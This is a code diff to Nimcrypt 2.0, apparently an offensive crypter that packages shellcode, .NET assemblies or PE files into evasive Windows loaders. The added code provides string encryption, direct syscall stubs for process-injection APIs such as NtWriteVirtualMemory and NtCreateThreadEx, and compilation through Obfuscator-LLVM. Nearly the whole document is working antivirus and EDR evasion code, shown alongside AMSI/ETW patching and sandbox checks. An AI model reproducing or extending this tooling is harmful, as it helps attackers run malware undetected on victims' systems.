@@ -15,6 +15,7 @@ import docopt
 import random
 import sugar
 import strutils
+import osproc
 import os
 
 func toByteSeq*(str: string): seq[byte] {.inline.} =
@@ -51,7 +52,7 @@ let doc = """
 Nimcrypt v 2.0
 
 Usage:
-  nimcrypt -f file_to_load -t csharp/raw/pe [-o <output>] [-p <process>] [-n] [-u] [-s] [-v]
+  nimcrypt -f file_to_load -t csharp/raw/pe [-o <output>] [-p <process>] [-n] [-u] [-s] [-e] [-g] [-l] [-v]
   nimcrypt (-h | --help)
 
 Options:
@@ -63,6 +64,9 @@ Options:
   -o --output filename   Filename for compiled exe
   -u --unhook            Unhook ntdll.dll
   -v --verbose           Enable verbose messages during execution
+  -e --encrypt-strings   Encrypt strings using the strenc module
+  -g --get-syscallstub   Use GetSyscallStub instead of NimlineWhispers2
+  -l --llvm-obfuscator   Use Obfuscator-LLVM to compile binary
   -n --no-randomization  Disable syscall name randomization
   -s --no-sandbox        Disable sandbox checks
 """
@@ -81,6 +85,9 @@ var typename: string = ""
 var process: string = "explorer.exe"
 var unhook: bool = false
 var verbose: bool = false
+var encrypt_strings: bool = false
+var llvm_obfuscator: bool = false
+var get_syscallstub: bool = false
 var no_sandbox: bool = false
 var no_randomization: bool = false
 
@@ -96,11 +103,22 @@ if args["--process"]:
 if args["--unhook"]:
   unhook = args["--unhook"]
 
+if args["--encrypt-strings"]:
+  encrypt_strings = args["--encrypt-strings"]
+  get_syscallstub = args["--encrypt-strings"]
+
 if args["--no-sandbox"]:
   no_sandbox = args["--no-sandbox"]
 
 if args["--verbose"]:
   verbose = args["--verbose"]
+
+if args["--llvm-obfuscator"]:
+  llvm_obfuscator = args["--llvm-obfuscator"]
+  get_syscallstub = args["--llvm-obfuscator"]
+
+if args["--get-syscallstub"]:
+  get_syscallstub = args["--get-syscallstub"]
 
 if args["--no-randomization"]:
   no_randomization = args["--no-randomization"]
@@ -135,6 +153,145 @@ ectx.clear()
 
 let encoded = encode(enctext)
 let encodedIV = encode(iv)
+
+let getsyscallstub_code = """
+# Credit/References
+# @ShitSecure: https://github.com/S3cur3Th1sSh1t/NimGetSyscallStub/blob/main/ShellcodeInject.nim
+
+# Unmanaged NTDLL Declarations
+type myNtOpenProcess = proc(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.stdcall.}
+type myNtAllocateVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
+type myNtWriteVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
+type myNtCreateThreadEx = proc(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.stdcall.}
+type myNtProtectVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}
+type myNtClose = proc(Handle: HANDLE): NTSTATUS {.stdcall.}
+type myNtQueueApcThread = proc(ThreadHandle: HANDLE, ApcRoutine: PKNORMAL_ROUTINE, ApcArgument1: PVOID, ApcArgument2: PVOID, ApcArgument3: PVOID): NTSTATUS {.stdcall.}
+type myNtAlertResumeThread = proc(ThreadHandle: HANDLE, PreviousSuspendCount: PULONG): NTSTATUS {.stdcall.}
+type myNtWaitForSingleObject = proc(ObjectHandle: HANDLE, Alertable: BOOLEAN, TimeOut: PLARGE_INTEGER): NTSTATUS {.stdcall.}
+
+let tProcess2 = GetCurrentProcessId()
+var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
+
+let syscallStub_NtOpenProcess = VirtualAllocEx(pHandle2, NULL, cast[SIZE_T](SYSCALL_STUB_SIZE), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
+
+var syscallStub_NtAllocateVirtualMemory: HANDLE = cast[HANDLE](syscallStub_NtOpenProcess) + cast[HANDLE](SYSCALL_STUB_SIZE)
+var syscallStub_NtWriteVirtualMemory: HANDLE = cast[HANDLE](syscallStub_NtAllocateVirtualMemory) + cast[HANDLE](SYSCALL_STUB_SIZE)
+var syscallStub_NtCreateThreadEx: HANDLE = cast[HANDLE](syscallStub_NtWriteVirtualMemory) + cast[HANDLE](SYSCALL_STUB_SIZE)
+var syscallStub_NtProtectVirtualMemory: HANDLE = cast[HANDLE](syscallStub_NtCreateThreadEx) + cast[HANDLE](SYSCALL_STUB_SIZE)
+var syscallStub_NtClose: HANDLE = cast[HANDLE](syscallStub_NtProtectVirtualMemory) + cast[HANDLE](SYSCALL_STUB_SIZE)
+var syscallStub_NtQueueApcThread: HANDLE = cast[HANDLE](syscallStub_NtClose) + cast[HANDLE](SYSCALL_STUB_SIZE)
+var syscallStub_NtAlertResumeThread: HANDLE = cast[HANDLE](syscallStub_NtQueueApcThread) + cast[HANDLE](SYSCALL_STUB_SIZE)
+var syscallStub_NtWaitForSingleObject: HANDLE = cast[HANDLE](syscallStub_NtAlertResumeThread) + cast[HANDLE](SYSCALL_STUB_SIZE)
+
+var oldProtection: DWORD = 0
+
+# define NtOpenProcess
+var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenProcess));
+VirtualProtect(cast[LPVOID](syscallStub_NtOpenProcess), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+# define NtAllocateVirtualMemory
+let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAllocateVirtualMemory));
+VirtualProtect(cast[LPVOID](syscallStub_NtAllocateVirtualMemory), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+# define NtWriteVirtualMemory
+let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWriteVirtualMemory));
+VirtualProtect(cast[LPVOID](syscallStub_NtWriteVirtualMemory), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+# define NtCreateThreadEx
+let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreateThreadEx));
+VirtualProtect(cast[LPVOID](syscallStub_NtCreateThreadEx), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+# define NtProtectVirtualMemory
+let NtProtectVirtualMemory = cast[myNtProtectVirtualMemory](cast[LPVOID](syscallStub_NtProtectVirtualMemory));
+VirtualProtect(cast[LPVOID](syscallStub_NtProtectVirtualMemory), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+# definte NtClose
+let NtClose = cast[myNtClose](cast[LPVOID](syscallStub_NtClose));
+VirtualProtect(cast[LPVOID](syscallStub_NtClose), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+# define NtQueueApcThread
+let NtQueueApcThread = cast[myNtQueueApcThread](cast[LPVOID](syscallStub_NtQueueApcThread));
+VirtualProtect(cast[LPVOID](syscallStub_NtQueueApcThread), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+# define NtAlertResumeThread
+let NtAlertResumeThread = cast[myNtAlertResumeThread](cast[LPVOID](syscallStub_NtAlertResumeThread));
+VirtualProtect(cast[LPVOID](syscallStub_NtAlertResumeThread), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+# define NtWaitForSingleObject
+let NtWaitForSingleObject = cast[myNtWaitForSingleObject](cast[LPVOID](syscallStub_NtWaitForSingleObject));
+VirtualProtect(cast[LPVOID](syscallStub_NtWaitForSingleObject), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+var success: BOOL
+
+var NtOpenProcess_str = decode("TnRPcGVuUHJvY2Vzcw==")
+var NtAllocateVirtualMemory_str = decode("TnRBbGxvY2F0ZVZpcnR1YWxNZW1vcnk=")
+var NtWriteVirtualMemory_str = decode("TnRXcml0ZVZpcnR1YWxNZW1vcnk=")
+var NtCreateThreadEx_str = decode("TnRDcmVhdGVUaHJlYWRFeA==")
+var NtProtectVirtualMemory_str = decode("TnRQcm90ZWN0VmlydHVhbE1lbW9yeQ==")
+var NtClose_str = decode("TnRDbG9zZQ==")
+var NtQueueApcThread_str = decode("TnRRdWV1ZUFwY1RocmVhZA==")
+var NtAlertResumeThread_str = decode("TnRBbGVydFJlc3VtZVRocmVhZA==")
+var NtWaitForSingleObject_str = decode("TnRXYWl0Rm9yU2luZ2xlT2JqZWN0")
+
+var gss_verbose: bool = REPLACE_ME_VERBOSE
+
+success = GetSyscallStub(NtOpenProcess_str, cast[LPVOID](syscallStub_NtOpenProcess));
+if gss_verbose == true:
+    if success == 1:
+        echo fmt"[*] Found Syscall Stub: {NtOpenProcess_str}"
+    else:
+        echo fmt"[!] Failed to Get Syscall Stub: {NtOpenProcess_str}"
+success = GetSyscallStub(NtAllocateVirtualMemory_str, cast[LPVOID](syscallStub_NtAllocateVirtualMemory));
+if gss_verbose == true:
+    if success == 1:
+        echo fmt"[*] Found Syscall Stub: {NtAllocateVirtualMemory_str}"
+    else:
+        echo fmt"[!] Failed to Get Syscall Stub: {NtAllocateVirtualMemory_str}"
+success = GetSyscallStub(NtWriteVirtualMemory_str, cast[LPVOID](syscallStub_NtWriteVirtualMemory));
+if gss_verbose == true:
+    if success == 1:
+        echo fmt"[*] Found Syscall Stub: {NtWriteVirtualMemory_str}"
+    else:
+        echo fmt"[!] Failed to Get Syscall Stub: {NtWriteVirtualMemory_str}"
+success = GetSyscallStub(NtCreateThreadEx_str, cast[LPVOID](syscallStub_NtCreateThreadEx));
+if gss_verbose == true:
+    if success == 1:
+        echo fmt"[*] Found Syscall Stub: {NtCreateThreadEx_str}"
+    else:
+        echo fmt"[!] Failed to Get Syscall Stub: {NtCreateThreadEx_str}"
+success = GetSyscallStub(NtProtectVirtualMemory_str, cast[LPVOID](syscallStub_NtProtectVirtualMemory));
+if gss_verbose == true:
+    if success == 1:
+        echo fmt"[*] Found Syscall Stub: {NtProtectVirtualMemory_str}"
+    else:
+        echo fmt"[!] Failed to Get Syscall Stub: {NtProtectVirtualMemory_str}"
+success = GetSyscallStub(NtClose_str, cast[LPVOID](syscallStub_NtClose));
+if gss_verbose == true:
+    if success == 1:
+        echo fmt"[*] Found Syscall Stub: {NtClose_str}"
+    else:
+        echo fmt"[!] Failed to Get Syscall Stub: {NtClose_str}"
+success = GetSyscallStub(NtQueueApcThread_str, cast[LPVOID](syscallStub_NtQueueApcThread));
+if gss_verbose == true:
+    if success == 1:
+        echo fmt"[*] Found Syscall Stub: {NtQueueApcThread_str}"
+    else:
+        echo fmt"[!] Failed to Get Syscall Stub: {NtQueueApcThread_str}"
+success = GetSyscallStub(NtAlertResumeThread_str, cast[LPVOID](syscallStub_NtAlertResumeThread));
+if gss_verbose == true:
+    if success == 1:
+        echo fmt"[*] Found Syscall Stub: {NtAlertResumeThread_str}"
+    else:
+        echo fmt"[!] Failed to Get Syscall Stub: {NtAlertResumeThread_str}"
+success = GetSyscallStub(NtWaitForSingleObject_str, cast[LPVOID](syscallStub_NtWaitForSingleObject));
+if gss_verbose == true:
+    if success == 1:
+        echo fmt"[*] Found Syscall Stub: {NtWaitForSingleObject_str}"
+    else:
+        echo fmt"[!] Failed to Get Syscall Stub: {NtWaitForSingleObject_str}"
+
+discard NtClose(pHandle2)
+"""
 
 let amsi_etw_patch = """
 # Credit/References
@@ -199,10 +356,10 @@ proc PETW(): bool =
 
     return disabled
 
-var success = Pm()
-echo fmt"[*] Applying amsi patch: {success}"
-success = PETW()
-echo fmt"[*] Applying etw patch: {success}"
+var patch_success = Pm()
+echo fmt"[*] Applying amsi patch: {patch_success}"
+patch_success = PETW()
+echo fmt"[*] Applying etw patch: {patch_success}"
 discard NtClose(hProc)
 """
 
@@ -323,7 +480,10 @@ import ptr_math
 import random
 import times
 import os
-include syscalls2
+REPLACE_ME_STRENC
+include REPLACE_ME_SYSCALL_INCLUDE
+
+REPLACE_ME_GETSYSCALLSTUB
 
 const PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000
 
@@ -496,6 +656,20 @@ when defined(windows):
 
     echo fmt"[+] Using {process} for shellcode injection"
     var stubFinal: string = stub.replace("REPLACE_ME_PROCESS", process)
+    if get_syscallstub == true:
+        echo "[+] GetSyscallStub enabled"
+        stubFinal = stubFinal.replace("REPLACE_ME_SYSCALL_INCLUDE", "GetSyscallStub")
+        stubFinal = stubFinal.replace("REPLACE_ME_GETSYSCALLSTUB", getsyscallstub_code)
+    else:
+        echo "[+] NimlineWhispers2 enabled"
+        stubFinal = stubFinal.replace("REPLACE_ME_SYSCALL_INCLUDE", "syscalls2")
+        stubFinal = stubFinal.replace("REPLACE_ME_GETSYSCALLSTUB", "")
+    if encrypt_strings == true:
+        echo "[+] String encryption enabled"
+        stubFinal = stubFinal.replace("REPLACE_ME_STRENC", "import strenc")
+    else:
+        echo "[+] String encryption disabled"
+        stubFinal = stubFinal.replace("REPLACE_ME_STRENC", "")
     if no_sandbox == false:
         echo "[+] Sandbox checks enabled"
         stubFinal = stubFinal.replace("REPLACE_ME_SANDBOX_CHECKS", sandbox_checks)
@@ -508,6 +682,12 @@ when defined(windows):
     else:
         echo "[+] Unhooking ntdll.dll disabled"
         stubFinal = stubFinal.replace("REPLACE_ME_NTDLL_UNHOOK", "")
+    if verbose == true:
+        echo "[+] Verbose messages enabled"
+        stubFinal = stubFinal.replace("REPLACE_ME_VERBOSE", "true")
+    else:
+        echo "[+] Verbose messages disabled"
+        stubFinal = stubFinal.replace("REPLACE_ME_VERBOSE", "false")
     stubFinal = stubFinal.replace("REPLACE_ME_ENCODED_BLOB", encoded)
     stubFinal = stubFinal.replace("REPLACE_ME_KEY", envkey)
     stubFinal = stubFinal.replace("REPLACE_ME_IV", encodedIV)
@@ -527,13 +707,33 @@ when defined(windows):
     if os.fileExists(outfile) == true:
         discard os.execShellCmd(fmt"rm {outfile}")
     if verbose == true:
-        echo "[+] Verbose messages enabled"
-        discard os.execShellCmd(fmt"nim c -d=release -d=mingw --hints=on --app=console --cpu=amd64 --out={outfile} stub.nim")
+        if llvm_obfuscator == false:
+            discard os.execShellCmd(fmt"nim c -d=release --cc:gcc --opt:size --passL:-s -d=mingw --hints=on --app=console --cpu=amd64 --hint[Pattern]:off --out={outfile} stub.nim")
+        else:
+            echo "[+] Using LLVM-Obfuscator to compile"
+            var result = execCmdEx("x86_64-w64-mingw32-clang -v")
+            if "Obfuscator-LLVM" in result.output:
+                let ochars = {'A'..'Z','0'..'9'}
+                var aesSeed = collect(newSeq, (for i in 0..<32: ochars.sample)).join
+                #Feel free to modify the Obfuscator-LLVM flags in the command below to fit your needs.
+                discard os.execShellCmd(fmt"nim c -d=release --cc:clang --opt:size --passL:-s --passC:'-mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -aesSeed={aesSeed}' -d=mingw --hints=on --app=console --cpu=amd64 --hint[Pattern]:off --out={outfile} stub.nim")
+            else:
+                echo "[!] Obfuscator-LLVM or wclang not installed or in path! Ensure that you can run 'x86_64-w64-mingw32-clang -v' and it shows 'Obfuscator-LLVM'."
     else:
-        echo "[+] Verbose messages disabled"
-        discard os.execShellCmd(fmt"nim c -d=release -d=mingw --hints=on --app=gui --cpu=amd64 --out={outfile} stub.nim")
-    discard os.execShellCmd("rm syscalls2.nim")
-    discard os.execShellCmd("rm stub.nim")
+        if llvm_obfuscator == false:
+            discard os.execShellCmd(fmt"nim c -d=release --cc:gcc --opt:size --passL:-s -d=mingw --hints=on --app=gui --cpu=amd64 --hint[Pattern]:off --out={outfile} stub.nim")
+        else:
+            echo "[+] Using Obfuscator-LLVM to compile"
+            var result = execCmdEx("x86_64-w64-mingw32-clang -v")
+            if "Obfuscator-LLVM" in result.output:
+                let ochars = {'A'..'Z','0'..'9'}
+                var aesSeed = collect(newSeq, (for i in 0..<32: ochars.sample)).join
+                #Feel free to modify the Obfuscator-LLVM flags in the command below to fit your needs.
+                discard os.execShellCmd(fmt"nim c -d=release --cc:clang --opt:size --passL:-s --passC:'-mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -aesSeed={aesSeed}' -d=mingw --hints=on --app=gui --cpu=amd64 --hint[Pattern]:off --out={outfile} stub.nim")
+            else:
+                echo "[!] Obfuscator-LLVM or wclang not installed or in path! Ensure that you can run 'x86_64-w64-mingw32-clang -v' and it shows 'Obfuscator-LLVM'."
+    #discard os.execShellCmd("rm syscalls2.nim")
+    #discard os.execShellCmd("rm stub.nim")
     if os.fileExists(outfile) == true:
         echo "\n" & fmt"[+] Stub compiled successfully as {outfile}"
     else:
@@ -556,7 +756,10 @@ import strformat
 import ptr_math
 import random
 import times
-include syscalls2
+REPLACE_ME_STRENC
+include REPLACE_ME_SYSCALL_INCLUDE
+
+REPLACE_ME_GETSYSCALLSTUB
 
 REPLACE_ME_SANDBOX_CHECKS
 
@@ -606,6 +809,20 @@ assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
     """
 
     var stubFinal: string = stub.replace("REPLACE_ME_AMSI_ETW_PATCH", amsi_etw_patch)
+    if get_syscallstub == true:
+        echo "[+] GetSyscallStub enabled"
+        stubFinal = stubFinal.replace("REPLACE_ME_SYSCALL_INCLUDE", "GetSyscallStub")
+        stubFinal = stubFinal.replace("REPLACE_ME_GETSYSCALLSTUB", getsyscallstub_code)
+    else:
+        echo "[+] NimlineWhispers2 enabled"
+        stubFinal = stubFinal.replace("REPLACE_ME_SYSCALL_INCLUDE", "syscalls2")
+        stubFinal = stubFinal.replace("REPLACE_ME_GETSYSCALLSTUB", "")
+    if encrypt_strings == true:
+        echo "[+] String encryption enabled"
+        stubFinal = stubFinal.replace("REPLACE_ME_STRENC", "import strenc")
+    else:
+        echo "[+] String encryption disabled"
+        stubFinal = stubFinal.replace("REPLACE_ME_STRENC", "")
     if no_sandbox == false:
         echo "[+] Sandbox checks enabled"
         stubFinal = stubFinal.replace("REPLACE_ME_SANDBOX_CHECKS", sandbox_checks)
@@ -618,6 +835,12 @@ assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
     else:
         echo "[+] Unhooking ntdll.dll disabled"
         stubFinal = stubFinal.replace("REPLACE_ME_NTDLL_UNHOOK", "")
+    if verbose == true:
+        echo "[+] Verbose messages enabled"
+        stubFinal = stubFinal.replace("REPLACE_ME_VERBOSE", "true")
+    else:
+        echo "[+] Verbose messages disabled"
+        stubFinal = stubFinal.replace("REPLACE_ME_VERBOSE", "false")
     stubFinal = stubFinal.replace("REPLACE_ME_ENCODED_BLOB", encoded)
     stubFinal = stubFinal.replace("REPLACE_ME_KEY", envkey)
     stubFinal = stubFinal.replace("REPLACE_ME_IV", encodedIV)
@@ -636,7 +859,18 @@ assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
     writeFile("stub.nim", stubFinal)
     if os.fileExists(outfile) == true:
         discard os.execShellCmd(fmt"rm {outfile}")
-    discard os.execShellCmd(fmt"nim c -d=release -d=mingw --hints=on --app=console --cpu=amd64 --out={outfile} stub.nim")
+    if llvm_obfuscator == false:
+        discard os.execShellCmd(fmt"nim c -d=release --cc:gcc --opt:size --passL:-s -d=mingw --hints=on --app=console --cpu=amd64 --hint[Pattern]:off --out={outfile} stub.nim")
+    else:
+        echo "[+] Using Obfuscator-LLVM to compile"
+        var result = execCmdEx("x86_64-w64-mingw32-clang -v")
+        if "Obfuscator-LLVM" in result.output:
+            let ochars = {'A'..'Z','0'..'9'}
+            var aesSeed = collect(newSeq, (for i in 0..<32: ochars.sample)).join
+            #Feel free to modify the Obfuscator-LLVM flags in the command below to fit your needs.
+            discard os.execShellCmd(fmt"nim c -d=release --cc:clang --opt:size --passL:-s --passC:'-mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -aesSeed={aesSeed}' -d=mingw --hints=on --app=console --cpu=amd64 --hint[Pattern]:off --out={outfile} stub.nim")
+        else:
+            echo "[!] Obfuscator-LLVM or wclang not installed or in path! Ensure that you can run 'x86_64-w64-mingw32-clang -v' and it shows 'Obfuscator-LLVM'."
     discard os.execShellCmd("rm syscalls2.nim")
     discard os.execShellCmd("rm stub.nim")
     if os.fileExists(outfile) == true:
@@ -659,7 +893,10 @@ import strutils
 import random
 import times
 import os
-include syscalls2
+REPLACE_ME_STRENC
+include REPLACE_ME_SYSCALL_INCLUDE
+
+REPLACE_ME_GETSYSCALLSTUB
 
 REPLACE_ME_SANDBOX_CHECKS
 
@@ -922,6 +1159,20 @@ status = NtWaitForSingleObject(hThread, TRUE, NULL)
 """
 
     var stubFinal: string = stub.replace("REPLACE_ME_AMSI_ETW_PATCH", amsi_etw_patch)
+    if get_syscallstub == true:
+        echo "[+] GetSyscallStub enabled"
+        stubFinal = stubFinal.replace("REPLACE_ME_SYSCALL_INCLUDE", "GetSyscallStub")
+        stubFinal = stubFinal.replace("REPLACE_ME_GETSYSCALLSTUB", getsyscallstub_code)
+    else:
+        echo "[+] NimlineWhispers2 enabled"
+        stubFinal = stubFinal.replace("REPLACE_ME_SYSCALL_INCLUDE", "syscalls2")
+        stubFinal = stubFinal.replace("REPLACE_ME_GETSYSCALLSTUB", "")
+    if encrypt_strings == true:
+        echo "[+] String encryption enabled"
+        stubFinal = stubFinal.replace("REPLACE_ME_STRENC", "import strenc")
+    else:
+        echo "[+] String encryption disabled"
+        stubFinal = stubFinal.replace("REPLACE_ME_STRENC", "")
     if no_sandbox == false:
         echo "[+] Sandbox checks enabled"
         stubFinal = stubFinal.replace("REPLACE_ME_SANDBOX_CHECKS", sandbox_checks)
@@ -958,7 +1209,18 @@ status = NtWaitForSingleObject(hThread, TRUE, NULL)
     writeFile("stub.nim", stubFinal)
     if os.fileExists(outfile) == true:
         discard os.execShellCmd(fmt"rm {outfile}")
-    discard os.execShellCmd(fmt"nim c -d=release -d=mingw --hints=on --app=console --cpu=amd64 --out={outfile} stub.nim")
+    if llvm_obfuscator == false:
+        discard os.execShellCmd(fmt"nim c -d=release --cc:gcc --opt:size --passL:-s -d=mingw --hints=on --app=console --cpu=amd64 --hint[Pattern]:off --out={outfile} stub.nim")
+    else:
+        echo "[+] Using Obfuscator-LLVM to compile"
+        var result = execCmdEx("x86_64-w64-mingw32-clang -v")
+        if "Obfuscator-LLVM" in result.output:
+            let ochars = {'A'..'Z','0'..'9'}
+            var aesSeed = collect(newSeq, (for i in 0..<32: ochars.sample)).join
+            #Feel free to modify the Obfuscator-LLVM flags in the command below to fit your needs.
+            discard os.execShellCmd(fmt"nim c -d=release --cc:clang --opt:size --passL:-s --passC:'-mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -aesSeed={aesSeed}' -d=mingw --hints=on --app=console --cpu=amd64 --hint[Pattern]:off --out={outfile} stub.nim")
+        else:
+            echo "[!] Obfuscator-LLVM or wclang not installed or in path! Ensure that you can run 'x86_64-w64-mingw32-clang -v' and it shows 'Obfuscator-LLVM'."
     discard os.execShellCmd("rm syscalls2.nim")
     discard os.execShellCmd("rm stub.nim")
     if os.fileExists(outfile) == true:
